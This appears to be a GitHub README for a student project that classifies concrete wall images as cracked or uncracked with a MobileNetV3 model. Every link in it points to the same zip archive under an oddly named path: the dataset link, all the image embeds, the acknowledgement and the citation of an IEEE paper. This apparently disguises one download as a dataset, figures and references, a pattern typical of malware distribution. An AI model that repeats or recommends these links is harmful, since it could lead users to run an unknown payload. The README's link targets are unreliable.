# Project-3-Crack-Road-Images-Classification-AI07

# Summary
The purpose of this project is to classify images of concrete wall whether it has cracks or not. In 
other words, binary classification of cracks wall and not cracks wall. 
This project use the dataset from 
[Concrete Crack Images for Classification][1] and was created using Google Colab. 
The framewok used is Pandas, Scikit-learn and TensorFlow Keras.

# Dataset

The dataset contains concrete images having cracks. The data is collected from various METU Campus Buildings.
The dataset is divided into two as negative and positive crack images for image classification. 
Each class has 20000images with a total of 40000 images with 227 x 227 pixels with RGB channels. 
The dataset is generated from 458 high-resolution images (4032x3024 pixel) with the method proposed by Zhang et al (2016). 
High-resolution images have variance in terms of surface finish and illumination conditions. 
No data augmentation in terms of random rotation or flipping is applied. 

### 0 is indicate as Negative Class

### 1 is indicate as Positive Class

[1]https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip

# Methodology

Load the dataset into Colab and extract using pyunpack package

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)


Split the Data

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

Use Pretrained Model MobileNetV3 as base model

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

Train the model with 6 epochs

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)



# Result

Achieve accuracy up to 99%

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

With validation loss

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

With Validation data get confusion matrix of

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

Example of prediction

![image](https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip)

# Acknowledgement

[SHRDC][2]


[2]https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip

2018 – Özgenel, Ç.F., Gönenç Sorguç, A. “Performance Comparison of Pretrained Convolutional Neural Networks on Crack Detection in Buildings”, ISARC 2018, Berlin.

Lei Zhang , Fan Yang , Yimin Daniel Zhang, and Y. J. Z., Zhang, L., Yang, F., Zhang, Y. D., & Zhu, Y. J. (2016). Road Crack Detection Using Deep Convolutional Neural Network. In 2016 IEEE International Conference on Image Processing (ICIP). https://github.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/raw/refs/heads/main/surreverently/Road-Crack-A-Project-Images-Classification-snowsuit.zip


